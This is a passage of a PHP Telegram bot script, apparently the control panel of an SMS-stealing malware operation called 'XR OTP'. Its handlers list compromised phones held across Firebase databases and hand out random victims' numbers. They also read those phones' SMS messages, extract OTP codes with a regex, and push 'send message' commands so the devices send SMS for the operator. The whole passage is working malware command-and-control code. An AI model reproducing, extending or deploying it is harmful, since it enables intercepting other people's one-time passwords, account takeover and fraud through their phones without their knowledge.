                'text' => "❌ Message text cannot be empty. Request cancelled."
            ]);
            exit;
        }
        
        $deviceId = $meta['device_id'] ?? '';
        $dbUrl = $meta['db_url'] ?? '';
        $dbIdx = $meta['db_idx'] ?? 0;
        $to = $meta['to'] ?? '';
        
        if (empty($deviceId) || empty($dbUrl) || empty($to)) {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "❌ Session expired or info missing. Please select the device again."
            ]);
            exit;
        }
        
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => "✉️ *Sending message `\"{$messageText}\"` to `{$to}` through device `{$deviceId}`...*",
            'parse_mode' => 'Markdown'
        ]);
        
        $simSlot = "0";
        
        // Define merged command payload to perform atomic updates
        $mergedPayload = [
            "command" => "send message",
            "messageText" => $messageText,
            "phoneNumber" => $to,
            "simSlot" => $simSlot,
            "targetDeviceId" => $deviceId,
            "webhookEvent" => [
                "sendSms" => [
                    "from"     => 1,
                    "isSended" => false,
                    "message"  => $messageText,
                    "to"       => $to
                ]
            ],
            "sms" => [
                "message" => $messageText,
                "status"  => "pending",
                "to"      => $to
            ],
            "action" => [
                "sendSms" => [
                    "message" => $messageText,
                    "status"  => "pending",
                    "to"      => $to
                ],
                "command" => "send message",
                "messageText" => $messageText,
                "phoneNumber" => $to,
                "simSlot" => $simSlot,
                "targetDeviceId" => $deviceId
            ]
        ];

        // Build list of target URL and payload requests (atomic PATCH requests to root paths)
        $requests = [];
        $requests[] = ['url' => rtrim($dbUrl, '/') . '/' . urlencode($deviceId) . '.json', 'method' => 'PATCH', 'data' => $mergedPayload];
        $requests[] = ['url' => rtrim($dbUrl, '/') . '/clients/' . urlencode($deviceId) . '.json', 'method' => 'PATCH', 'data' => $mergedPayload];
        $requests[] = ['url' => rtrim($dbUrl, '/') . '/user_data/' . urlencode($deviceId) . '.json', 'method' => 'PATCH', 'data' => $mergedPayload];

        // Execute writes in parallel using curl_multi
        $mh = curl_multi_init();
        $handles = [];
        foreach ($requests as $i => $req) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $req['url']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 6);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

            if ($req['method'] === 'PUT' || $req['method'] === 'PATCH') {
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $req['method']);
            }
            if ($req['data'] !== null) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($req['data']));
                curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            }
            curl_multi_add_handle($mh, $ch);
            $handles[$i] = $ch;
        }

        $active = null;
        do {
            $mrc = curl_multi_exec($mh, $active);
        } while ($mrc == CURLM_CALL_MULTI_PERFORM);

        while ($active && $mrc == CURLM_OK) {
            if (curl_multi_select($mh) == -1) {
                usleep(100);
            }
            do {
                $mrc = curl_multi_exec($mh, $active);
            } while ($mrc == CURLM_CALL_MULTI_PERFORM);
        }

        $success = false;
        foreach ($handles as $i => $ch) {
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if ($httpCode >= 200 && $httpCode < 300) {
                $success = true;
            }
            curl_multi_remove_handle($mh, $ch);
            curl_close($ch);
        }
        curl_multi_close($mh);

        
        if ($success) {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "✅ *SMS command sent successfully!*\nMessage is queued for device `{$deviceId}`.",
                'parse_mode' => 'Markdown'
            ]);
        } else {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "❌ Failed to send SMS command through Firebase. Please verify device connection status."
            ]);
        }
        exit;
    }

    // ── Session: waiting for search device ID value ─────────────────────
    if ($session === 'waiting_for_device_id_search' && strpos($text, '/') !== 0) {
        clearSessionAction($chatId);
        $searchQuery = strtoupper(trim($text));
        $mappings = loadDeviceMappings();
        
        $devInfo = null;
        if (isset($mappings[$searchQuery])) {
            $devInfo = $mappings[$searchQuery];
        }
        
        if ($devInfo) {
            $deviceId = $devInfo['id'];
            $dbUrl = $devInfo['db_url'];
            $dbIdx = $devInfo['db_idx'];
            
            // Check status
            $devices = getAllDevicesFromDBs();
            $status = false;
            foreach ($devices as $d) {
                if ($d['id'] === $deviceId) {
                    $status = $d['status'];
                    break;
                }
            }
            
            // Fetch client details to check phone number
            $clientData = firebaseRequestByURL($dbUrl, "clients/" . urlencode($deviceId));
            if (empty($clientData) || !is_array($clientData)) {
                $clientData = firebaseRequestByURL($dbUrl, "user_data/" . urlencode($deviceId));
            }
            $mobNo = is_array($clientData) ? extractMobNo($clientData) : '';
            
            $statusStr = $status ? "🟢 Online" : "🔴 Offline";
            $response = "📟 *Device Found!*\n\n"
                      . "🆔 *Device ID:* *{$searchQuery}*\n"
                      . "📞 *Number:* " . (!empty($mobNo) ? "`{$mobNo}`" : "_Not Available_") . "\n"
                      . "📱 *Device Name:* `{$devInfo['name']}`\n"
                      . "🏢 *Database:* DB #" . ($dbIdx + 1) . "\n"
                      . "⚡ *Status:* {$statusStr}";

            $inlineKeyboard = [
                'inline_keyboard' => [[
                    ['text' => '✉️ Send Message', 'callback_data' => "sendmsg_" . $searchQuery],
                    ['text' => '📥 Receive OTP', 'callback_data' => "otp_" . $searchQuery]
                ]]
            ];

            telegramRequest('sendMessage', [
                'chat_id'      => $chatId,
                'text'         => $response,
                'parse_mode'   => 'Markdown',
                'reply_markup' => $inlineKeyboard
            ]);
        } else {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "❌ Device ID `{$searchQuery}` mappings me nahi mila. Pehle device list fresh karne ke liye `/start` ya `/reset` kare."
            ]);
        }
        exit;
    }

    // ── Session: waiting for search/link device name ────────────────────
    if ($session === 'waiting_for_device_name_val' && strpos($text, '/') !== 0) {
        $meta = getSessionData($chatId)['meta'] ?? [];
        clearSessionAction($chatId);
        
        $number = $meta['number'] ?? '';
        $deviceName = trim($text);
        
        if (empty($number) || empty($deviceName)) {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "❌ Session error. Please try /start again."
            ]);
            exit;
        }
        
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => "🔍 *Linking number `{$number}` to device `{$deviceName}`...*",
            'parse_mode' => 'Markdown'
        ]);
        
        // Find if device exists in any Firebase DB to get correct URL
        $targetDbUrl = $firebaseUrls[0] ?? '';
        $responses = firebaseRequestMulti($firebaseUrls, '/clients');
        $found = false;
        foreach ($responses as $idx => $dbData) {
            if (empty($dbData) || !is_array($dbData)) continue;
            if (isset($dbData[$deviceName])) {
                $targetDbUrl = $firebaseUrls[$idx];
                $found = true;
                break;
            }
        }
        if (!$found) {
            $responses = firebaseRequestMulti($firebaseUrls, '/user_data');
            foreach ($responses as $idx => $dbData) {
                if (empty($dbData) || !is_array($dbData)) continue;
                if (isset($dbData[$deviceName])) {
                    $targetDbUrl = $firebaseUrls[$idx];
                    $found = true;
                    break;
                }
            }
        }
        
        if (empty($targetDbUrl)) {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "❌ No Firebase URLs configured in bot_settings.json."
            ]);
            exit;
        }
        
        // Patch Firebase client record
        $patchData = [
            'mobNo' => $number,
            'phoneNumber' => $number
        ];
        
        $url1 = rtrim($targetDbUrl, '/') . '/clients/' . urlencode($deviceName) . '.json';
        $url2 = rtrim($targetDbUrl, '/') . '/user_data/' . urlencode($deviceName) . '.json';
        
        $success = false;
        foreach ([$url1, $url2] as $url) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($patchData));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($httpCode >= 200 && $httpCode < 300) {
                $success = true;
            }
        }
        
        if ($success) {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "✅ *Number successfully linked!*\nNumber `{$number}` has been assigned to device `{$deviceName}`.",
                'parse_mode' => 'Markdown'
            ]);
        } else {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "❌ Failed to update number on Firebase."
            ]);
        }
        exit;
    }
    
    // Clear session on commands
    if (strpos($text, '/') === 0) {
        clearSessionAction($chatId);
    }

    if (strpos($text, '/start') === 0) {
        $welcome = "👋 *Welcome to XR OTP!*\n\n"
            . "This bot reads active online devices across all Firebase databases.\n\n"
            . "🤖 *Options:*\n"
            . "🟢 *Show Online Devices* — Online/Offline counts\n"
            . "🎲 *Generate Numbers* — Generate a random number from database\n"
            . "📜 *History* — View history of generated numbers\n"
            . "🔍 *Search Device ID* — Query messages of a specific Device ID";
            
        $keyboard = [
            'keyboard' => [
                [['text' => '🟢 Show Online Devices'], ['text' => '🎲 Generate Numbers']],
                [['text' => '📜 History'],             ['text' => '🔍 Search Device ID']],
                [['text' => '🔄 Reset Bot']]
            ],
            'resize_keyboard' => true
        ];
        
        telegramRequest('sendMessage', [
            'chat_id'      => $chatId,
            'text'         => $welcome,
            'parse_mode'   => 'Markdown',
            'reply_markup' => $keyboard
        ]);
    } 
    // Reset Bot Command
    elseif (strpos($text, '/reset') === 0 || $text === '🔄 Reset Bot') {
        clearSessionAction($chatId);
        file_put_contents(__DIR__ . '/bot_sessions.json', '{}');
        file_put_contents(__DIR__ . '/device_mappings.json', '{}');
        file_put_contents(__DIR__ . '/viewed_messages.json', '{}');
        if (file_exists(__DIR__ . '/num_mappings.json')) file_put_contents(__DIR__ . '/num_mappings.json', '{}');
        if (file_exists(__DIR__ . '/active_scans.json')) file_put_contents(__DIR__ . '/active_scans.json', '{}');
        
        $welcome = "✅ *Bot Reset Complete!*\n\n"
            . "Sessions, mappings aur viewed messages clear ho gaye.\n\n"
            . "🤖 *Options:*\n"
            . "🟢 *Show Online Devices* — Online/Offline counts\n"
            . "🎲 *Generate Numbers* — Generate a random number from database\n"
            . "📜 *History* — View history of generated numbers\n"
            . "🔍 *Search Device ID* — Query messages of a specific Device ID";
            
        $keyboard = [
            'keyboard' => [
                [['text' => '🟢 Show Online Devices'], ['text' => '🎲 Generate Numbers']],
                [['text' => '📜 History'],             ['text' => '🔍 Search Device ID']],
                [['text' => '🔄 Reset Bot']]
            ],
            'resize_keyboard' => true
        ];
        
        telegramRequest('sendMessage', [
            'chat_id'      => $chatId,
            'text'         => $welcome,
            'parse_mode'   => 'Markdown',
            'reply_markup' => $keyboard
        ]);
    }

    // ── NEW: Show Online Devices (Online/Offline summary counts) ────────
    elseif ($text === '🟢 Show Online Devices' || $text === 'Show Online Devices' || strpos($text, '/online') === 0 || strpos($text, '/devices') === 0) {
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => "🔍 *Scanning all Firebase databases for online devices, please wait...*",
            'parse_mode' => 'Markdown'
        ]);

        $stats = getDeviceStatsFromDBs();
        
        $responseText = "📊 *Firebase Device Status Summary:*\n\n"
                      . "🟢 *Online Devices:* `{$stats['online']}`\n"
                      . "🔴 *Offline Devices:* `{$stats['offline']}`";
                      
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => $responseText,
            'parse_mode' => 'Markdown'
        ]);
    }
    // ── NEW: Generate Numbers ──────────────────────────────────────────
    elseif ($text === '🎲 Generate Numbers' || $text === 'Generate Numbers' || strpos($text, '/generatenum') === 0) {
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => "🎲 *Generating a random number...*",
            'parse_mode' => 'Markdown'
        ]);

        $devices = getAllDevicesFromDBs();
        $validDevices = [];
        foreach ($devices as $dev) {
            if (!empty($dev['mobNo']) && $dev['status'] === true) {
                $validDevices[] = $dev;
            }
        }

        if (empty($validDevices)) {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "❌ No devices with phone numbers found in the database."
            ]);
            exit;
        }

        // Pick one randomly
        $randomDev = $validDevices[array_rand($validDevices)];
        $mobNo = $randomDev['mobNo'];
        $devId = $randomDev['id'];
        $devName = $randomDev['name'];
        $dbIdx = $randomDev['db_idx'];
        $dbUrl = $randomDev['db_url'];
        $status = $randomDev['status'];

        // Save to history
        $historyFile = __DIR__ . '/generated_history.json';
        $history = file_exists($historyFile) ? (json_decode(file_get_contents($historyFile), true) ?: []) : [];
        if (!isset($history[$chatId])) {
            $history[$chatId] = [];
        }
        
        $found = false;
        foreach ($history[$chatId] as $item) {
            if ($item['number'] === $mobNo && $item['device_id'] === $devId) {
                $found = true;
                break;
            }
        }
        if (!$found) {
            $history[$chatId][] = [
                'number' => $mobNo,
                'device_id' => $devId,
                'device_name' => $devName,
                'db_idx' => $dbIdx,
                'db_url' => $dbUrl,
                'generated_at' => time()
            ];
            file_put_contents($historyFile, json_encode($history, JSON_PRETTY_PRINT));
        }

        // Find serial ID by finding index in the main list of all devices
        $serialId = 'A1';
        foreach ($devices as $index => $d) {
            if ($d['id'] === $devId) {
                $serialId = getShortSerialId($index);
                break;
            }
        }

        $statusStr = $status ? "🟢 Online" : "🔴 Offline";
        $response = "🎲 *Random Number Generated!*\n\n"
                  . "🆔 *Device ID:* *{$serialId}*\n"
                  . "📞 *Number:* `{$mobNo}`\n"
                  . "📱 *Device Name:* `{$devName}`\n"
                  . "🏢 *Database:* DB #" . ($dbIdx + 1) . "\n"
                  . "⚡ *Status:* {$statusStr}\n\n"
                  . "💡 _You can view this number in your History anytime._";

        $inlineKeyboard = [
            'inline_keyboard' => [[
                ['text' => '✉️ Send Message', 'callback_data' => "sendmsg_" . $serialId],
                ['text' => '📥 Receive OTP', 'callback_data' => "otp_" . $serialId]
            ]]
        ];

        telegramRequest('sendMessage', [
            'chat_id'      => $chatId,
            'text'         => $response,
            'parse_mode'   => 'Markdown',
            'reply_markup' => $inlineKeyboard
        ]);
    }
    // ── NEW: History ───────────────────────────────────────────────────
    elseif ($text === '📜 History' || $text === 'History' || strpos($text, '/history') === 0) {
        $historyFile = __DIR__ . '/generated_history.json';
        $history = file_exists($historyFile) ? (json_decode(file_get_contents($historyFile), true) ?: []) : [];
        $userHistory = isset($history[$chatId]) ? $history[$chatId] : [];

        if (empty($userHistory)) {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "📜 *Your History is empty.*\n\nClick `🎲 Generate Numbers` to generate one!",
                'parse_mode' => 'Markdown'
            ]);
            exit;
        }

        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => "🔍 *Fetching current status of your history items...*",
            'parse_mode' => 'Markdown'
        ]);

        $devices = getAllDevicesFromDBs();
        $statusMap = [];
        $serialMap = [];
        foreach ($devices as $index => $d) {
            $statusMap[$d['id']] = $d['status'];
            $serialMap[$d['id']] = getShortSerialId($index);
        }

        $responseText = "📜 *Your Generated Numbers History:*\n\n";

        foreach ($userHistory as $idx => $item) {
            $devId = $item['device_id'];
            $mobNo = $item['number'];
            $devName = $item['device_name'];
            $dbIdx = $item['db_idx'];
            
            $isOnline = isset($statusMap[$devId]) ? $statusMap[$devId] : false;
            $serialId = isset($serialMap[$devId]) ? $serialMap[$devId] : 'N/A';
            $statusStr = $isOnline ? "🟢 Online" : "🔴 Offline";
            
            $responseText .= "*Record #" . ($idx + 1) . "*\n"
                          . "🆔 *Device ID:* *{$serialId}*\n"
                          . "📞 *Number:* `{$mobNo}`\n"
                          . "📱 *Device Name:* `{$devName}`\n"
                          . "🏢 *Database:* DB #" . ($dbIdx + 1) . "\n"
                          . "⚡ *Status:* {$statusStr}\n"
                          . "──────────────────\n\n";
        }

        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => $responseText,
            'parse_mode' => 'Markdown'
        ]);
    }
    // ── NEW: Search Device ID ───────────────────────────────────────────
    elseif ($text === '🔍 Search Device ID' || $text === 'Search Device ID' || strpos($text, '/searchdev') === 0 || strpos($text, '/finddev') === 0) {
        setSessionAction($chatId, 'waiting_for_device_id_search');
        telegramRequest('sendMessage', [
            'chat_id'    => $chatId,
            'text'       => "🔍 *Enter the Device ID (e.g. A1, A2, G1, G2, etc.):*",
            'parse_mode' => 'Markdown'
        ]);
    }
    // Search number feature: /s <number> (shows top 5 messages)
    elseif (strpos($text, '/s ') === 0 || strpos($text, '/search ') === 0) {
        $parts = explode(' ', $text);
        if (count($parts) < 2) {
            telegramRequest('sendMessage', ['chat_id' => $chatId, 'text' => "⚠️ Format: /s <serial_id_or_number>"]);
            exit;
        }
        
        $searchQuery = trim($parts[1]);
        $upperQuery = strtoupper($searchQuery);
        $mappings = loadDeviceMappings();
        
        $devInfo = null;
        if (isset($mappings[$upperQuery])) {
            $devInfo = $mappings[$upperQuery];
        }
        
        if ($devInfo) {
            $deviceId = $devInfo['id'];
            $dbUrl = $devInfo['db_url'];
            
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "🔍 *Querying messages for device {$upperQuery} ({$devInfo['name']})...*",
                'parse_mode' => 'Markdown'
            ]);
            
            // Fetch messages for device from Firebase
            $val = firebaseRequestByURL($dbUrl, "messages/" . urlencode($deviceId));
            if (empty($val) || !is_array($val)) {
                $val = firebaseRequestByURL($dbUrl, urlencode($deviceId));
            }
            
            if (empty($val) || !is_array($val)) {
                telegramRequest('sendMessage', ['chat_id' => $chatId, 'text' => "❌ No messages found on this device."]);
                exit;
            }
            
            // Sort messages by timestamp descending
            usort($val, function($a, $b) {
                $tsA = isset($a['timestamp']) ? (int)$a['timestamp'] : 0;
                $tsB = isset($b['timestamp']) ? (int)$b['timestamp'] : 0;
                return $tsB - $tsA;
            });
            
            $top5 = array_slice($val, 0, 5);
            $response = "📟 *Device ID:* `{$upperQuery}` ({$devInfo['name']})\n" .
                        "🏢 *Database:* DB #" . ($devInfo['db_idx'] + 1) . "\n\n";
            
            foreach ($top5 as $index => $msg) {
                if (!is_array($msg)) continue;
                $body = isset($msg['message']) ? $msg['message'] : (isset($msg['body']) ? $msg['body'] : 'No Body');
                $sender = isset($msg['sender']) ? $msg['sender'] : 'Unknown';
                $time = isset($msg['dateTime']) ? $msg['dateTime'] : (isset($msg['date']) ? $msg['date'] : 'N/A');
                preg_match('/\b\d{4,8}\b/', $body, $matches);
                $otpCode = !empty($matches) ? $matches[0] : 'Not detected';
                
                $response .= "*Message #" . ($index + 1) . "*\n" .
                    "💬 *Body:* `{$body}`\n" .
                    "🔑 *Extracted OTP:* `{$otpCode}`\n" .
                    "🏢 *Sender:* *{$sender}*\n" .
                    "📅 *Received At:* _{$time}_\n" .
                    "----------------------------------\n\n";
            }
            
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => $response,
                'parse_mode' => 'Markdown'
            ]);
        } else {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "🔍 *Searching databases for matching records...*",
                'parse_mode' => 'Markdown'
            ]);

            $allNumbers = getAllDemoNumbers();
            $matchedKeys = [];
            
            foreach ($allNumbers as $uniqueId => $info) {
                if (strpos($info['number'], $searchQuery) !== false || strpos($info['key'], $searchQuery) !== false) {
                    $matchedKeys[$uniqueId] = $info;
                }
            }
            
            if (empty($matchedKeys)) {
                telegramRequest('sendMessage', [
                    'chat_id' => $chatId,
                    'text' => "❌ No matching records found for `{$searchQuery}`.",
                    'parse_mode' => 'Markdown'
                ]);
                exit;
            }
            
            foreach ($matchedKeys as $uniqueId => $info) {
                $dbUrl = $info['db_url'];
                $key = $info['key'];
                $type = $info['type'];
                
                if ($type === 'explicit') {
                    $val = firebaseRequestByURL($dbUrl, "numbers/$key");
                    if (!$val) continue;
                    
                    $otp = isset($val['otp']) ? $val['otp'] : 'No OTP';
                    $sender = isset($val['sender']) ? $val['sender'] : 'Unknown';
                    $time = isset($val['updatedAt']) ? date('Y-m-d H:i:s', $val['updatedAt'] / 1000) : 'N/A';
                    
                    $response = "📱 *Search Result for Number:* `{$info['number']}`\n" .
                        "🏢 *Database:* DB #" . ($info['db_idx'] + 1) . "\n\n" .
                        "🔑 *Latest OTP:* `{$otp}`\n" .
                        "🏢 *Sender:* *{$sender}*\n" .
                        "📅 *Received At:* _{$time}_";
                    
                    telegramRequest('sendMessage', [
                        'chat_id' => $chatId,
                        'text' => $response,
                        'parse_mode' => 'Markdown'
                    ]);
                } else {
                    $val = firebaseRequestByURL($dbUrl, $key);
                    if (empty($val) || !is_array($val)) continue;
                    
                    usort($val, function($a, $b) {
                        $tsA = isset($a['timestamp']) ? (int)$a['timestamp'] : 0;
                        $tsB = isset($b['timestamp']) ? (int)$b['timestamp'] : 0;
                        return $tsB - $tsA;
                    });
                    
                    $top5 = array_slice($val, 0, 5);
                    
                    $response = "📟 *Search Results for Device:* `{$key}` (Top " . count($top5) . " messages)\n" .
                        "🏢 *Database:* DB #" . ($info['db_idx'] + 1) . "\n\n";
                    
                    foreach ($top5 as $index => $msg) {
                        if (!is_array($msg)) continue;
                        $body = isset($msg['message']) ? $msg['message'] : (isset($msg['body']) ? $msg['body'] : 'No Body');
                        $sender = isset($msg['sender']) ? $msg['sender'] : 'Unknown';
                        $time = isset($msg['dateTime']) ? $msg['dateTime'] : (isset($msg['date']) ? $msg['date'] : 'N/A');
                        preg_match('/\b\d{4,8}\b/', $body, $matches);
                        $otpCode = !empty($matches) ? $matches[0] : 'Not detected';
                        
                        $response .= "*Message #" . ($index + 1) . "*\n" .
                            "💬 *Body:* `{$body}`\n" .
                            "🔑 *Extracted OTP:* `{$otpCode}`\n" .
                            "🏢 *Sender:* *{$sender}*\n" .
                            "📅 *Received At:* _{$time}_\n" .
                            "----------------------------------\n\n";
                    }
                    
                    telegramRequest('sendMessage', [
                        'chat_id' => $chatId,
                        'text' => $response,
                        'parse_mode' => 'Markdown'
                    ]);
                }
            }
        }
    }
    // Admin Command Control Panel /admin
    elseif ($text === '/admin' && $isAdmin) {
        $statusStr = BOT_ENABLED ? "🟢 ON" : "🔴 OFF";
        $panel = "👑 *Welcome to Admin Dashboard Panel*\n\n" .
            "Current Bot Status: *{$statusStr}*\n" .
            "Total Firebase URLs: *" . count($firebaseUrls) . "*\n\n" .
            "🤖 *Admin Commands:*\n" .
            "• `/status on` - Enable Telegram bot updates\n" .
            "• `/status off` - Disable Telegram bot updates\n" .
            "• `/dbadd <url>` - Append a new Firebase DB URL\n" .
            "• `/dbdel <url>` - Remove a Firebase DB URL\n" .
            "• `/broadcast <message>` - Broadcast a message to all users";
            
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => $panel,
            'parse_mode' => 'Markdown'
        ]);
    }
    // Admin Action: Status change
    elseif (strpos($text, '/status ') === 0 && $isAdmin) {
        $parts = explode(' ', $text);
        $val = strtolower(trim($parts[1]));
        
        $settings['bot_enabled'] = ($val === 'on');
        $settings['firebase_urls'] = $firebaseUrls;
        saveSettings($settings);
        
        $statusMsg = $settings['bot_enabled'] ? "🟢 Bot enabled successfully." : "🔴 Bot disabled successfully.";
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => $statusMsg
        ]);
    }
    // Admin Action: Add DB URL
    elseif (strpos($text, '/dbadd ') === 0 && $isAdmin) {
        $parts = explode(' ', $text);
        $newUrl = trim($parts[1]);
        
        if (!in_array($newUrl, $firebaseUrls)) {
            $firebaseUrls[] = $newUrl;
            $settings['bot_enabled'] = BOT_ENABLED;
            $settings['firebase_urls'] = $firebaseUrls;
            saveSettings($settings);
            
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "✅ URL added successfully. Total: " . count($firebaseUrls)
            ]);
        } else {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "⚠️ URL already exists."
            ]);
        }
    }
    // Admin Action: Delete DB URL
    elseif (strpos($text, '/dbdel ') === 0 && $isAdmin) {
        $parts = explode(' ', $text);
        $delUrl = trim($parts[1]);
        
        $key = array_search($delUrl, $firebaseUrls);
        if ($key !== false) {
            unset($firebaseUrls[$key]);
            $firebaseUrls = array_values($firebaseUrls);
            
            $settings['bot_enabled'] = BOT_ENABLED;
            $settings['firebase_urls'] = $firebaseUrls;
            saveSettings($settings);
            
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "🗑️ URL deleted successfully. Total: " . count($firebaseUrls)
            ]);
        } else {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "❌ URL not found in config."
            ]);
        }
    }
    // Admin Action: Broadcast messaging
    elseif (strpos($text, '/broadcast ') === 0 && $isAdmin) {
        $broadcastMsg = trim(substr($text, 11));
        
        if (empty($broadcastMsg)) {
            telegramRequest('sendMessage', ['chat_id' => $chatId, 'text' => "⚠️ Please supply text message to broadcast."]);
            exit;
        }
        
        if (file_exists($usersFile)) {
            $users = json_decode(file_get_contents($usersFile), true);
        } else {
            $users = [];
        }
        
        if (!empty($users)) {
            $success = 0;
            foreach ($users as $uId) {
                $res = telegramRequest('sendMessage', [
                    'chat_id' => $uId,
                    'text' => "📢 *Broadcast Message:*\n\n" . $broadcastMsg,
                    'parse_mode' => 'Markdown'
                ]);
                if (isset($res['ok']) && $res['ok']) {
                    $success++;
                }
            }
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "✅ Broadcast complete. Delivered to {$success}/" . count($users) . " users."
            ]);
        } else {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "❌ No users found in database."
            ]);
        }
    }
}
elseif (isset($update['callback_query'])) {
    $callbackQuery   = $update['callback_query'];
    $callbackQueryId = $callbackQuery['id'];
    $chatId          = $callbackQuery['message']['chat']['id'];
    $data            = $callbackQuery['data'];

    // ── History Number Selection ──────────────────────────────────────────
    if (strpos($data, 'hist_opt_') === 0) {
        $historyIndex = (int)substr($data, 9);
        $historyFile = __DIR__ . '/generated_history.json';
        $history = file_exists($historyFile) ? (json_decode(file_get_contents($historyFile), true) ?: []) : [];
        $userHistory = isset($history[$chatId]) ? $history[$chatId] : [];
        
        if (!isset($userHistory[$historyIndex])) {
            telegramRequest('answerCallbackQuery', [
                'callback_query_id' => $callbackQueryId,
                'text' => '❌ Selected item not found in history.',
                'show_alert' => true
            ]);
            exit;
        }
        
        $item = $userHistory[$historyIndex];
        $devId = $item['device_id'];
        $dbUrl = $item['db_url'];
        $dbIdx = $item['db_idx'];
        $mobNo = $item['number'];
        $devName = $item['device_name'];
        
        // Fetch current status
        $devices = getAllDevicesFromDBs();
        $isOnline = false;
        $serialId = 'A1';
        foreach ($devices as $index => $d) {
            if ($d['id'] === $devId) {
                $isOnline = $d['status'];
                $serialId = getShortSerialId($index);
                break;
            }
        }
        
        telegramRequest('answerCallbackQuery', ['callback_query_id' => $callbackQueryId]);
        
        $statusStr = $isOnline ? "🟢 Online" : "🔴 Offline";
        $response = "📜 *History Item Details*\n\n"
                  . "🆔 *Device ID:* *{$serialId}*\n"
                  . "📞 *Number:* `{$mobNo}`\n"
                  . "📱 *Device Name:* `{$devName}`\n"
                  . "🏢 *Database:* DB #" . ($dbIdx + 1) . "\n"
                  . "⚡ *Status:* {$statusStr}";

        telegramRequest('sendMessage', [
            'chat_id'      => $chatId,
            'text'         => $response,
            'parse_mode'   => 'Markdown'
        ]);
        exit;
    }

    // ── Refresh for Find Number result ────────────────────────────────────
    if (strpos($data, 'refresh_num_') === 0) {
        telegramRequest('answerCallbackQuery', ['callback_query_id' => $callbackQueryId]);

        $nmFile = __DIR__ . '/num_mappings.json';
        $numMappings = file_exists($nmFile) ? (json_decode(file_get_contents($nmFile), true) ?: []) : [];

        if (!isset($numMappings[$chatId])) {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text'    => "⚠️ Session expire ho gayi. Phir se 🔍 *Find Number* use karo.",
                'parse_mode' => 'Markdown'
            ]);
            exit;
        }

        $nm     = $numMappings[$chatId];
        $devId  = $nm['device_id'];
        $dbUrl  = $nm['db_url'];
        $dbIdx  = $nm['db_idx'];
        $mobNo  = $nm['mobNo'];

        $msgsText = getTop5MessagesText($devId, $dbUrl, $dbIdx, $mobNo);
        if (!$msgsText) {
            telegramRequest('sendMessage', ['chat_id' => $chatId, 'text' => "📭 Koi naya message nahi mila."]);
            exit;
        }

        $header = "🔄 *Refreshed Messages*\n📞 Number: `{$mobNo}`\n\n";
        $refreshBtn = ['inline_keyboard' => [[['text' => '🔄 Refresh Messages', 'callback_data' => 'refresh_num_' . $chatId]]]];

        telegramRequest('sendMessage', [
            'chat_id'      => $chatId,
            'text'         => $header . $msgsText,
            'parse_mode'   => 'Markdown',
            'reply_markup' => $refreshBtn
        ]);
        exit;
    }

    if (strpos($data, 'sendmsg_') === 0) {
        $serialId = strtoupper(substr($data, 8));
        $mappings = loadDeviceMappings();
        
        if (!isset($mappings[$serialId])) {
            telegramRequest('answerCallbackQuery', [
                'callback_query_id' => $callbackQueryId,
                'text' => 'Selected device not found or mapping expired.',
                'show_alert' => true
            ]);
            exit;
        }
        
        telegramRequest('answerCallbackQuery', ['callback_query_id' => $callbackQueryId]);
        
        $devInfo = $mappings[$serialId];
        $deviceId = $devInfo['id'];
        $dbUrl = $devInfo['db_url'];
        $dbIdx = $devInfo['db_idx'];
        
        setSessionAction($chatId, 'waiting_for_send_msg_num', [
            'device_id' => $deviceId,
            'db_url' => $dbUrl,
            'db_idx' => $dbIdx
        ]);
        
        telegramRequest('sendMessage', [
